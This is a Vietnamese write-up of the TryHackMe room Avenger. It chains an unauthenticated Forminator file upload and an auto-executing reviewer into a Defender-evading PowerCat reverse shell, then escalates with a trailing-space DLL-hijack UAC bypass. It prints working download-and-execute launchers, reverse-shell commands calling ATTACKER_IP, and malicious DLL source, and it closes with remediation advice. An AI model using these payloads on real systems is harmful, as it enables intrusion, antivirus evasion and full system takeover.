@@ -1,0 +1,259 @@
+---
+title: 'Avenger'
+description: "A walkthrough of TryHackMe's Avenger — Forminator 1.24.1 unrestricted file upload plus an auto-executing reviewer delivers an AV-evading PowerCat shell, followed by UAC bypass via trailing-space trusted-folder DLL hijacking for full system access."
+date: 2026-01-10
+platform: tryhackme
+room: 'Avenger'
+roomUrl: 'https://tryhackme.com/room/avenger'
+difficulty: medium
+tags:
+  - 'web'
+  - 'wordpress'
+  - 'cve'
+  - 'file-upload'
+  - 'rce'
+  - 'windows'
+  - 'uac-bypass'
+  - 'dll-hijacking'
+  - 'privesc'
+vulnClasses:
+  - 'unrestricted file upload'
+  - 'uac bypass'
+  - 'dll search-order hijacking'
+translation: done
+draft: false
+---
+
+_Bài phân tích room Avenger trên TryHackMe — plugin WordPress Forminator 1.24.1 cho phép tải lên file không bị kiểm tra loại, một reviewer tự động thực thi mọi nội dung được nộp, chúng ta gửi reverse shell PowerCat né tránh AV, rồi vượt qua UAC bằng kỹ thuật DLL hijacking thư mục tin cậy với trailing space để chiếm hoàn toàn hệ thống Windows._
+
+> Các flag, địa chỉ IP và thông tin xác thực thực tế đều đã được ẩn đi. Avenger là room luyện tập hợp lệ trên TryHackMe; mọi thao tác đều được thực hiện trên mục tiêu hợp pháp. Giá trị hiển thị là `<redacted>` là có thực trên box nhưng bị giữ lại ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Rustscan → Apache 2.4.56 / WordPress tại `/gift` / Forminator 1.24.1 (CVE-2023-4596) → exploit công khai thất bại (upload thành công nhưng file không xuất hiện tại đượng dẫn dự kiến) → phản hồi biểu mẫu ghi _"đội sẽ xem xét kỹ mọi tin nhắn"_ → beacon HTML xác nhận reviewer tải nội dung đã upload → tải lên `.bat` tải xuống **PowerCat shell đã mã hóa base64** từ HTTP server của kẻ tấn công và thực thi nó → **vượt qua Windows Defender** → reverse shell với tư cách `gift\hugo` → user flag `THM{<redacted>}` → `hugo` thuộc nhóm Administrators nhưng **Medium Integrity** (UAC đang hoạt động) → biên dịch `Secur32.dll` độc hại, tải `ncat.exe` → tạo `C:\Windows \System32\` (thư mục trailing-space — do user sở hữu, được auto-elevation tin tưởng) → copy `computerdefaults.exe` vào đó → đặt DLL → chạy → **tự nâng quyền, tải DLL của chúng ta** → shell High Integrity → root flag tại `C:\Users\Administrator\Desktop\root.txt` `THM{<redacted>}`.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-tun0-ip>
+```
+
+Avenger chạy Windows Server với XAMPP — Apache 2.4.56, PHP 8.0.28, MariaDB 10.4.28 — và một cài đặt WordPress tại `/gift`:
+
+```text
+http://$IP/          →  Danh sách thư mục Apache (mở)
+http://$IP/gift/     →  WordPress, biểu mẫu liên hệ Forminator 1.24.1
+http://$IP/dashboard →  phpMyAdmin (403 từ bên ngoài)
+```
+
+Cổng 5985 (WinRM), SMB (445) và MySQL (3306) cũng đang mở cùng nhiều cổng RPC Windows — profile điển hình của Windows/XAMPP.
+
+### **Lỗ hổng: CVE-2023-4596 + reviewer thực thi file upload**
+
+WPScan xác định **Forminator 1.24.1** trên trang WordPress `/gift`:
+
+```text
+[+] forminator
+ | Version: 1.24.1 (100% confidence)
+ | [!] The version is out of date, the latest version is 1.49.2
+```
+
+Forminator ≤ 1.24.6 bị ảnh hưởng bởi **CVE-2023-4596** — tải lên file tùy ý không cần xác thực. Tuy nhiên, exploit công khai (EDB-51664) không hoạt động ở đây: file được chấp nhận nhưng không xuất hiện tại đượng dẫn `/wp-content/uploads/<year>/<month>/` như mong đợi.
+
+Bề mặt tấn công thực sự được tiết lộ qua thông báo xác nhận của biểu mẫu:
+
+> _"Đội ngũ sẽ xem xét rất kỹ mọi tin nhắn."_
+
+<Callout type="insight">
+
+Dòng chữ đó không phải nội dung trang trí — nó báo hiệu một primitive tấn công hành vi. Nếu có gì đó (người xem xét hoặc pipeline tự động) mở mọi bài nộp, thì **mọi file upload đều là RCE tiềm năng**. CVE-2023-4596 loại bỏ xác thực loại file phía server; reviewer thực thi nội dung biến khả năng upload đó thành remote code execution mù.
+
+</Callout>
+
+### **Bước 1 — Xác nhận reviewer bằng beacon HTML**
+
+Trước khi upload shell, hãy xác minh giả thuyết: tạo một file HTML tối giản tham chiếu đến tài nguyên trên HTTP server của kẻ tấn công.
+
+```text
+<img src="http://$ATTACKER_IP:9000/land.jpg"/>
+```
+
+Khởi động HTTP server:
+
+```text
+python3 -m http.server 9000
+```
+
+Upload file `.html` qua biểu mẫu Forminator. Trong vài giây, server ghi nhận request đến:
+
+```text
+10.x.x.x - - [10/Jan/2026 18:45:26] "GET /land.jpg HTTP/1.1" 200 -
+```
+
+Đã xác nhận — thứ gì đó trên mục tiêu tải tài nguyên từ máy kẻ tấn công ngay sau khi mỗi bài nộp được xem xét.
+
+### **Bước 2 — Xây dựng PowerCat reverse shell né tránh AV**
+
+Windows Defender đang hoạt động trên mục tiêu. Chiến lược né tránh: mã hóa payload PowerCat bằng base64 và lưu trong file `.txt`; một launcher `.bat` tải xuống và thực thi nó. Bản thân file batch không chứa shellcode PowerShell — chỉ là lệnh download-and-run — và blob base64 không bị quét chữ ký.
+
+Trên máy kẻ tấn công, tạo payload PowerCat đã mã hóa:
+
+```text
+LPORT=49731
+pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $ATTACKER_IP -p $LPORT -e cmd.exe -ge" > shell-49731.txt
+```
+
+Tạo launcher batch `exp.bat`:
+
+```text
+START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://$ATTACKER_IP:9000/shell-49731.txt');iex 'powershell -E $code'
+```
+
+Khởi động listener và HTTP server:
+
+```text
+nc -lvnp 49731
+python3 -m http.server 9000
+```
+
+### **Bước 3 — Upload file batch, bắt shell**
+
+Upload `exp.bat` qua biểu mẫu `/gift`. Reviewer mở nó; PowerShell tải blob base64 từ HTTP server và thực thi payload PowerCat:
+
+```text
+10.x.x.x - - [10/Jan/2026 19:02:15] "GET /shell-49731.txt HTTP/1.1" 200 -
+```
+
+```text
+connect to [$ATTACKER_IP] from (UNKNOWN) [10.x.x.x] 49887
+Microsoft Windows [Version 10.0.17763.4499]
+
+C:\Windows\system32> whoami
+gift\hugo
+```
+
+User flag ở trên Desktop của `hugo`:
+
+```text
+C:\Users\hugo\Desktop> type user.txt
+THM{<redacted>}
+```
+
+### **Bước 4 — Liệt kê đường leo thang đặc quyền**
+
+`whoami /all` cho thấy `hugo` thuộc `BUILTIN\Administrators` — nhưng mọi mục nhóm administrator đều được đánh dấu **"Group used for deny only"**, dấu hiệu của **Medium Integrity** (UAC đang chặn token không được kích hoạt đầy đủ):
+
+```text
+BUILTIN\Administrators  S-1-5-32-544  Group used for deny only
+Mandatory Label\Medium Mandatory Level  S-1-16-8192
+```
+
+Xác nhận cài đặt UAC từ registry:
+
+```text
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+    ConsentPromptBehaviorAdmin  REG_DWORD  0x5
+```
+
+Giá trị `5` nghĩa là hệ thống sẽ yêu cầu xác nhận trước khi chạy binary không phải của Windows ở high integrity. Chúng ta cần một UAC bypass im lặng.
+
+### **Bước 5 — UAC bypass bằng DLL hijacking thư mục tin cậy trailing-space**
+
+`computerdefaults.exe` (`C:\Windows\System32\computerdefaults.exe`) là binary Windows **tự nâng quyền không có UAC prompt** và tải `Secur32.dll` từ thư mục làm việc của nó khi khởi động.
+
+Thủ thuật: tạo `C:\Windows \System32\` — **trailing space** sau `Windows` khiến đây là thư mục thuộc sở hữu user mà bạn kiểm soát hoàn toàn. Kiểm tra đường dẫn auto-elevation của Windows loại bỏ trailing space trước khi so sánh, vì vậy nó thấy `C:\Windows\System32\` và coi binary là đáng tin cậy. Bạn có quyền ghi đầy đủ vào đường dẫn vượt qua kiểm tra tin tưởng.
+
+Trên máy kẻ tấn công, biên dịch `Secur32.dll` độc hại:
+
+```text
+// custom.cpp
+#include <windows.h>
+
+void exec_custom() {
+    WinExec("c:\\users\\hugo\\Desktop\\ncat.exe -e cmd.exe $ATTACKER_IP 49732", 1);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) exec_custom();
+    return TRUE;
+}
+```
+
+```text
+x86_64-w64-mingw32-gcc -shared -o Secur32.dll custom.cpp
+```
+
+Trên mục tiêu, tải `ncat.exe`, tạo đường dẫn tin cậy giả, đặt DLL:
+
+```text
+curl http://$ATTACKER_IP:9000/ncat.exe -o C:\Users\hugo\Desktop\ncat.exe
+
+mkdir "C:\Windows \"
+mkdir "C:\Windows \System32\"
+copy "C:\Windows\System32\computerdefaults.exe" "C:\Windows \System32\computerdefaults.exe"
+curl http://$ATTACKER_IP:9000/Secur32.dll -o "C:\Windows \System32\Secur32.dll"
+```
+
+Khởi động listener thứ hai:
+
+```text
+nc -lvnp 49732
+```
+
+Kích hoạt bypass:
+
+```text
+"C:\Windows \System32\computerdefaults.exe"
+```
+
+Binary tự nâng quyền, tải `Secur32.dll` của chúng ta, và `DllMain` kích hoạt — kết nối trở lại ở High Integrity:
+
+```text
+connect to [$ATTACKER_IP] from (UNKNOWN) [10.x.x.x] 50099
+
+C:\Windows\system32> whoami
+gift\hugo
+
+C:\Users\Administrator\Desktop> type root.txt
+THM{<redacted>}
+```
+
+`hugo` vẫn là `hugo` — UAC bypass không đổi tài khoản người dùng. Nó nâng integrity level lên High, cho tư cách thành viên nhóm Administrator có hiệu lực đầy đủ và quyền truy cập không hạn chế vào toàn bộ hệ thống.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Cao — CVSS 3.1 8.8** (`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`). Chiếm quyền hoàn toàn từ remote đến root trong hai giai đoạn:
+
+- **Tải lên file không xác thực → RCE qua reviewer**: Forminator 1.24.1 (CVE-2023-4596) loại bỏ xác thực loại file phía server. Reviewer trên box tự động thực thi mọi bài nộp, biến primitive upload thành RCE mù — không cần xác thực.
+- **AV evasion được xác nhận**: staging PowerCat base64 né tránh Windows Defender khi upload và thực thi, minh họa rằng chỉ phát hiện dựa trên chữ ký là không đủ với các kỹ thuật staging đơn giản.
+- **Chiếm hoàn toàn hệ thống**: UAC bypass trailing-space âm thầm nâng `hugo` lên High Integrity Administrator, cấp quyền truy cập không hạn chế vào toàn bộ Windows host bao gồm dữ liệu của người dùng khác.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Cập nhật Forminator lên ≥ 1.29.0**: phiên bản đã vá thực thi xác thực allow-list phía server (extension và MIME type). Nếu không thể nâng cấp ngay, hãy vô hiệu hóa trường upload file trong tất cả biểu mẫu Forminator đang hoạt động như biện pháp tạm thời.
+2. **Sandbox hóa quy trình reviewer**: bất kỳ workflow nào tự động mở nội dung do người dùng nộp phải chạy trong môi trường sandbox cô lập internet, ít đặc quyền và không có khả năng tạo kết nối mạng ra ngoài. Loại bỏ primitive "reviewer thực thi nội dung" phá vỡ toàn bộ chuỗi tấn công bất kể lỗ hổng upload.
+3. **Củng cố UAC**: đặt `ConsentPromptBehaviorAdmin = 2` (luôn nhắc trên secure desktop). Theo dõi việc tạo thư mục có trailing space dưới `C:\` bằng Sysmon event ID 11 hoặc quy tắc phát hiện path-anomaly của EDR. Không cấp tư cách thành viên nhóm Administrator cục bộ cho tài khoản ứng dụng hoặc dịch vụ.
+
+</Callout>
+
+### **Rút kinh nghiệm**
+
+- **Thông báo ứng dụng là thông tin tình báo.** _"Đội ngũ sẽ xem xét kỹ mọi tin nhắn"_ trực tiếp tiết lộ bề mặt tấn công hành vi — reviewer thực thi nội dung của người dùng. Hãy đọc mọi văn bản trên màn hình trước khi dùng exploit.
+- **Đường tấn công CVE có thể không phải con đường thực.** EDB-51664 thất bại ở đây vì file upload không thể truy cập tại đường dẫn mong đợi. Vector hành vi — reviewer — mới là lỗ hổng thực sự, và nó không cần exploit CVE cụ thể nào cả.
+- **Staging đánh bại chữ ký.** Chia reverse shell thành launcher `.bat` và blob base64 `.txt` né tránh việc quét on-access của Windows Defender. Phát hiện hành vi (PowerShell download-and-execute, kết nối ra ngoài bất thường) vẫn sẽ phát hiện điều này trên host đã được củng cố — khoảng cách giữa phát hiện chữ ký và hành vi là bài học thực sự.
+- **`C:\Windows \`** **là primitive UAC bypass kinh điển.** Thủ thuật trailing-space cho bạn một thư mục thuộc sở hữu user vượt qua kiểm tra tin tưởng auto-elevation. Kết hợp với bất kỳ binary tự nâng quyền nào có đường tìm kiếm DLL bao gồm thư mục của chính nó.
+
+Avenger là chiếc thang hai bậc: plugin chưa được vá cho phép upload bất kỳ thứ gì, và reviewer thực thi những gì nhận được biến điều đó thành RCE. Không lỗ hổng nào đơn lẻ nguy hiểm bằng cả hai kết hợp lại.
